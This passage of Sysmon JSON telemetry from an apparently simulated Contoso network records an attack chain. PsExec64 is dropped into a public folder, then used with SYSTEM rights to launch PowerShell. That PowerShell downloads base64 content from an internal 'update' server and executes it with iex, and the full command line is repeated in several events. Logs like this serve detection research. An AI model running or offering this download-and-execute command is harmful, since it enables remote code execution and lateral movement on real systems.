            "creation_time": "2019-02-19 00:26:54.882",
            "event_id": "76784c4c05c28250cd8d34181b01b0057181b88acbf134978594d29b96105568",
            "event_type": "file",
            "event_utc": "2020-09-24T18:40:01.947Z",
            "exe": "lsass.exe",
            "file_name": "netlogon.ftl",
            "file_path": "C:\\Windows\\System32\\config\\netlogon.ftl",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "76784c4c05c28250cd8d34181b01b0057181b88acbf134978594d29b96105568",
            "image_path": "C:\\windows\\system32\\lsass.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "file",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4097957",
            "subtype": "create",
            "time": "2020-09-24T18:40:01.956Z",
            "timestamp": 1600972801956,
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
        {
            "action": "start",
            "count": 31,
            "dest_fqdn": "srv-dc-11.contoso.org",
            "dest_hostname": "srv-dc-11",
            "dest_ip": "10.0.0.7",
            "dest_ipv6": "false",
            "dest_port": 135,
            "event_id": "85d25b9247811c0b7b5a0cebb54d3b9ff36cdd0fbb906c3a147e5137f986b3b6",
            "event_type": "flow",
            "event_utc": "2020-09-24T18:40:14.060Z",
            "exe": "lsass.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "85d25b9247811c0b7b5a0cebb54d3b9ff36cdd0fbb906c3a147e5137f986b3b6",
            "image_path": "C:\\Windows\\System32\\lsass.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4097959",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.3",
            "src_ipv6": "false",
            "src_port": 64583,
            "subtype": "start",
            "time": "2020-09-24T18:40:03.666Z",
            "timestamp": 1600972803666,
            "transport": "tcp",
            "user": "NT AUTHORITY\\SYSTEM",
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
        {
            "action": "create",
            "creation_time": "2020-09-24 18:47:17.311",
            "event_id": "264a1ebf3eb271895fbbe8b5f24bbd7e3eda88de3b3169b49687f7b5db193236",
            "event_type": "file",
            "event_utc": "2020-09-24T18:47:17.311Z",
            "exe": "powershell.exe",
            "file_name": "PsExec64.exe",
            "file_path": "C:\\Users\\Public\\PsExec64.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "264a1ebf3eb271895fbbe8b5f24bbd7e3eda88de3b3169b49687f7b5db193236",
            "image_path": "c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "file",
            "pid": 3544,
            "process_guid": "{DD483508-E26C-5F6C-0000-0010E0300501}",
            "record_number": "4098083",
            "subtype": "create",
            "time": "2020-09-24T18:47:17.316Z",
            "timestamp": 1600973237316,
            "uuid": "{DD483508-E26C-5F6C-0000-0010E0300501}"
        },
        {
            "action": "start",
            "count": 5636,
            "dest_fqdn": "srv-sft-update-38.contoso.org",
            "dest_hostname": "srv-sft-update-38",
            "dest_ip": "10.0.0.8",
            "dest_ipv6": "false",
            "dest_port": 443,
            "event_id": "edab82553036b58fc69f1f4b7b49409df082f767ca9e7868e507d681e6810536",
            "event_type": "flow",
            "event_utc": "2020-09-24T18:51:49.654Z",
            "exe": "powershell.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "edab82553036b58fc69f1f4b7b49409df082f767ca9e7868e507d681e6810536",
            "image_path": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 3544,
            "process_guid": "{DD483508-E26C-5F6C-0000-0010E0300501}",
            "record_number": "4098160",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.3",
            "src_ipv6": "false",
            "src_port": 64817,
            "subtype": "start",
            "time": "2020-09-24T18:51:39.395Z",
            "timestamp": 1600973499395,
            "transport": "tcp",
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-E26C-5F6C-0000-0010E0300501}"
        },
        {
            "action": "start",
            "count": 26,
            "dest_fqdn": "srv-dc-11.contoso.org",
            "dest_hostname": "srv-dc-11",
            "dest_ip": "10.0.0.7",
            "dest_ipv6": "false",
            "dest_port": 88,
            "event_id": "4f26a3f49a3d1142e097409acb2b57942c9dafa0270aaa2f5abe30a4bae57d43",
            "event_type": "flow",
            "event_utc": "2020-09-24T18:54:29.934Z",
            "exe": "lsass.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "4f26a3f49a3d1142e097409acb2b57942c9dafa0270aaa2f5abe30a4bae57d43",
            "image_path": "C:\\Windows\\System32\\lsass.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4098199",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.3",
            "src_ipv6": "false",
            "src_port": 64863,
            "subtype": "start",
            "time": "2020-09-24T18:54:19.070Z",
            "timestamp": 1600973659070,
            "transport": "tcp",
            "user": "NT AUTHORITY\\SYSTEM",
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
        {
            "action": "create",
            "command_line": "C:\\windows\\system32\\cmd.exe /C C:\\Users\\Public\\PsExec64.exe -s /accepteula \\\\cmp-535872 cmd /c powershell.exe -NonInteractive -NoProfile \"iex ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String( (wget http://srv-sft-update-38/download/readme.txt -UseBasicParsing).Content.Split()[-1] )))\"",
            "event_id": "22a82c75e4d17928163c78c0ed2e9e66db87f9b24b82876512c728cc129b2fb9",
            "event_type": "process",
            "event_utc": "2020-09-24T19:02:31.525Z",
            "exe": "cmd.exe",
            "fqdn": "cmp-535872.contoso.org",
            "hash": {
                "MD5": "8FAFBE3C23E2BE4D6A3C063118B9A4F2",
                "SHA256": "4C3EA4C44AAB74350355C419826B8C9E6172C3BD8F0BB5817ECF7BE50B629051"
            },
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "22a82c75e4d17928163c78c0ed2e9e66db87f9b24b82876512c728cc129b2fb9",
            "image_path": "C:\\Windows\\SysWOW64\\cmd.exe",
            "integrity_level": "High",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "logon_guid": "{E0425724-A193-46EB-8062-B64C378337CC}",
            "logon_id": "0xf28ca3",
            "nodetype": "event",
            "object": "process",
            "original_file_name": "Cmd.Exe",
            "parent_command_line": "\"c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe\" -Version 5.1 -s -NoLogo -NoProfile",
            "parent_exe": "powershell.exe",
            "parent_image_path": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
            "parent_process_guid": "{DD483508-E26C-5F6C-0000-0010E0300501}",
            "pid": 4092,
            "ppid": 3544,
            "process_guid": "{DD483508-ED47-5F6C-0000-0010B041B401}",
            "record_number": "4098329",
            "subtype": "create",
            "terminal_session_id": "1",
            "time": "2020-09-24T19:02:31.535Z",
            "timestamp": 1600974151535,
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-ED47-5F6C-0000-0010B041B401}"
        },
        {
            "action": "access",
            "call_trace": "C:\\windows\\SYSTEM32\\ntdll.dll+a18c4|C:\\windows\\System32\\wow64.dll+14591|C:\\windows\\System32\\wow64.dll+13d83|C:\\windows\\System32\\wow64.dll+6523|C:\\windows\\System32\\wow64cpu.dll+1923|C:\\windows\\System32\\wow64.dll+1aefc|C:\\windows\\System32\\wow64.dll+bea0|C:\\windows\\SYSTEM32\\ntdll.dll+792b8|C:\\windows\\SYSTEM32\\ntdll.dll+78e3b|C:\\windows\\SYSTEM32\\ntdll.dll+78dee|C:\\windows\\SYSTEM32\\ntdll.dll+702fc(wow64)|C:\\windows\\System32\\KERNELBASE.dll+d3a96(wow64)|C:\\windows\\System32\\KERNELBASE.dll+189dbb(wow64)|C:\\windows\\System32\\KERNELBASE.dll+189a6c(wow64)|C:\\Program Files\\Windows Event Reporting\\Core\\EventReporting.ApplicationFilter.Monitor.Win32.dll+31c2(wow64)|UNKNOWN(0000000071971000)|UNKNOWN(000000000C6064BB)|UNKNOWN(000000000C6065D3)|UNKNOWN(000000000C60672B)|UNKNOWN(000000000C601965)|UNKNOWN(000000000C601A87)|UNKNOWN(000000000C6071CC)|UNKNOWN(000000000C600506)|UNKNOWN(000000000C6078A8)",
            "event_id": "32b1e2d40afcca75da1b1c1251c3f126901b73f09b488aae493750925185117d",
            "event_type": "process",
            "event_utc": "2020-09-24T19:02:31.523Z",
            "exe": "cmd.exe",
            "fqdn": "cmp-535872.contoso.org",
            "granted_access": "0x1fffff",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "32b1e2d40afcca75da1b1c1251c3f126901b73f09b488aae493750925185117d",
            "image_path": "C:\\windows\\SysWOW64\\cmd.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "process",
            "pid": 4092,
            "process_guid": "{DD483508-ED47-5F6C-0000-0010B041B401}",
            "record_number": "4098330",
            "src_exe": "powershell.exe",
            "src_image_path": "c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe",
            "src_pid": "3544",
            "src_process_guid": "{DD483508-E26C-5F6C-0000-0010E0300501}",
            "subtype": "access",
            "time": "2020-09-24T19:02:31.536Z",
            "timestamp": 1600974151536,
            "uuid": "{DD483508-ED47-5F6C-0000-0010B041B401}"
        },
        {
            "action": "create",
            "command_line": "C:\\Users\\Public\\PsExec64.exe  -s /accepteula \\\\cmp-535872 cmd /c powershell.exe -NonInteractive -NoProfile \"iex ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String( (wget http://srv-sft-update-38/download/readme.txt -UseBasicParsing).Content.Split()[-1] )))\"",
            "event_id": "ca430d568722a845ae23f9c02d15b60aaafd777ba1cbd2ba3f38e3f22dc9aaf4",
            "event_type": "process",
            "event_utc": "2020-09-24T19:02:31.818Z",
            "exe": "PsExec64.exe",
            "fqdn": "cmp-535872.contoso.org",
            "hash": {
                "MD5": "9321C107D1F7E336CDA550A2BF049108",
                "SHA256": "AD6B98C01EE849874E4B4502C3D7853196F6044240D3271E4AB3FC6E3C08E9A4"
            },
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "ca430d568722a845ae23f9c02d15b60aaafd777ba1cbd2ba3f38e3f22dc9aaf4",
            "image_path": "C:\\Users\\Public\\PsExec64.exe",
            "integrity_level": "High",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "logon_guid": "{E0425724-A193-46EB-8062-B64C378337CC}",
            "logon_id": "0xf28ca3",
            "nodetype": "event",
            "object": "process",
            "original_file_name": "psexec.c",
            "parent_command_line": "C:\\windows\\system32\\cmd.exe /C C:\\Users\\Public\\PsExec64.exe -s /accepteula \\\\cmp-535872 cmd /c powershell.exe -NonInteractive -NoProfile \"iex ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String( (wget http://srv-sft-update-38/download/readme.txt -UseBasicParsing).Content.Split()[-1] )))\"",
            "parent_exe": "cmd.exe",
            "parent_image_path": "C:\\Windows\\SysWOW64\\cmd.exe",
            "parent_process_guid": "{DD483508-ED47-5F6C-0000-0010B041B401}",
            "pid": 10328,
            "ppid": 4092,
            "process_guid": "{DD483508-ED47-5F6C-0000-00104A64B401}",
            "record_number": "4098331",
            "subtype": "create",
            "terminal_session_id": "1",
            "time": "2020-09-24T19:02:31.824Z",
            "timestamp": 1600974151824,
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-ED47-5F6C-0000-00104A64B401}"
        },
        {
            "action": "create",
            "command_line": "C:\\windows\\PSEXESVC.exe",
            "event_id": "bfb6f41a870b8330fca4baab757cb0cb8387414ee6655e5b3b7c04599c28358b",
            "event_type": "process",
            "event_utc": "2020-09-24T19:02:31.905Z",
            "exe": "PSEXESVC.exe",
            "fqdn": "cmp-535872.contoso.org",
            "hash": {
                "MD5": "AE5BB9F3FFF1AEAAAD619BAB105B2391",
                "SHA256": "224F549F33854ED53667055786DC1073E64B7428FAE26F27DAB9828ED502BB99"
            },
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "bfb6f41a870b8330fca4baab757cb0cb8387414ee6655e5b3b7c04599c28358b",
            "image_path": "C:\\Windows\\PSEXESVC.exe",
            "integrity_level": "System",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "logon_guid": "{DD483508-D8C0-5F6C-0000-0020E7030000}",
            "logon_id": "0x3e7",
            "nodetype": "event",
            "object": "process",
            "original_file_name": "psexesvc.exe",
            "parent_command_line": "C:\\windows\\system32\\services.exe",
            "parent_exe": "services.exe",
            "parent_image_path": "C:\\Windows\\System32\\services.exe",
            "parent_process_guid": "{DD483508-D8C0-5F6C-0000-0010C7BD0000}",
            "pid": 11072,
            "ppid": 780,
            "process_guid": "{DD483508-ED47-5F6C-0000-00107679B401}",
            "record_number": "4098334",
            "subtype": "create",
            "terminal_session_id": "0",
            "time": "2020-09-24T19:02:31.909Z",
            "timestamp": 1600974151909,
            "user": "NT AUTHORITY\\SYSTEM",
            "uuid": "{DD483508-ED47-5F6C-0000-00107679B401}"
        },
        {
            "action": "create",
            "command_line": "\"cmd\" /c powershell.exe -NonInteractive -NoProfile \"iex ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String( (wget http://srv-sft-update-38/download/readme.txt -UseBasicParsing).Content.Split()[-1] )))\"",
            "event_id": "4d1e2ee4885f832a517bbd2ad4c8d9789a0b151a9a4c256792da8085bf2f2f5e",
            "event_type": "process",
            "event_utc": "2020-09-24T19:02:32.061Z",
            "exe": "cmd.exe",
            "fqdn": "cmp-535872.contoso.org",
            "hash": {
                "MD5": "E08FE2DE3DDD22123247D49A11B4F53D",
                "SHA256": "EC436AEEE41857EEE5875EFDB7166FE043349DB5F58F3EE9FC4FF7F50005767F"
            },
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "4d1e2ee4885f832a517bbd2ad4c8d9789a0b151a9a4c256792da8085bf2f2f5e",
            "image_path": "C:\\Windows\\System32\\cmd.exe",
            "integrity_level": "System",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "logon_guid": "{DD483508-D8C0-5F6C-0000-0020E7030000}",
            "logon_id": "0x3e7",
            "nodetype": "event",
            "object": "process",
            "original_file_name": "Cmd.Exe",
            "parent_command_line": "C:\\windows\\PSEXESVC.exe",
            "parent_exe": "PSEXESVC.exe",
            "parent_image_path": "C:\\Windows\\PSEXESVC.exe",
            "parent_process_guid": "{DD483508-ED47-5F6C-0000-00107679B401}",
            "pid": 3456,
            "ppid": 11072,
            "process_guid": "{DD483508-ED48-5F6C-0000-0010FB86B401}",
            "record_number": "4098349",
            "subtype": "create",
            "terminal_session_id": "0",
            "time": "2020-09-24T19:02:32.079Z",
            "timestamp": 1600974152079,
            "user": "NT AUTHORITY\\SYSTEM",
            "uuid": "{DD483508-ED48-5F6C-0000-0010FB86B401}"
        },
